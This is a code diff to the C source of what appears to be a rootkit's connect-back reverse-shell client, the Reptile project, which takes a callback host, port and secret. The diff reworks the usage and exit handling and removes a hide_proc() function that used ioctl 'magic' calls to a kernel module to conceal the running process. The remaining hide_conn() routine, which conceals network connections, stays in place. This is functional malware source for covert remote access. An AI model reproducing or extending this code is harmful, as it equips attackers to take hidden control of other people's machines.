@@ -26,7 +26,6 @@ void usage(char *argv0)
 {
 	fprintf(stderr, "Usage: %s [ -t connect_back_host ] ", argv0);
 	fprintf(stderr, "[ -p port ] [ -s secret ] [ -r delay (optional) ]\n");
-	exit(1);
 }
 
 #endif
@@ -254,26 +253,6 @@ struct control {
 	void *argv;
 };
 
-void hide_proc(void)
-{
-	unsigned int pid;
-	struct control args;
-	int sockioctl = socket(AF_INET, SOCK_STREAM, 6);
-
-	if (sockioctl < 0)
-		exit(1);
-
-	args.cmd = 1;
-	pid = (unsigned int)getpid();
-	args.argv = &pid;
-	if (ioctl(sockioctl, AUTH, HTUA) == 0) {
-		if (ioctl(sockioctl, AUTH, &args) == 0)
-			ioctl(sockioctl, AUTH, HTUA);
-	}
-
-	close(sockioctl);
-}
-
 void hide_conn(struct sockaddr_in addr, int hide)
 {
 	struct control args;
@@ -318,11 +297,10 @@ int main(int argc, char **argv)
 		case 'p':
 			connect_back_port = atoi(optarg);
 			if (!connect_back_port) {
-#ifdef _REPTILE_
-				exit(1);
-#else
-				usage(*argv);
+#ifndef _REPTILE_
+				usage(*argv);		
 #endif
+				exit(1);
 			}
 			break;
 		case 's':
@@ -332,27 +310,21 @@ int main(int argc, char **argv)
 			delay = atoi(optarg);
 			break;
 		default:
-#ifdef _REPTILE_
-			exit(1);
-#else
-			usage(*argv);
+#ifndef _REPTILE_
+			usage(*argv);		
 #endif
+			exit(1);
 			break;
 		}
 	}
 
 	if (connect_back_host == NULL || connect_back_port == 0 ||
 	    secret == NULL) {
-#ifdef _REPTILE_
+#ifndef _REPTILE_
+		usage(*argv);		
+#endif
 		exit(1);
-#else
-		usage(*argv);
-#endif
 	}
-
-#ifdef _REPTILE_
-	hide_proc();
-#endif
 
 	pid = fork();
 
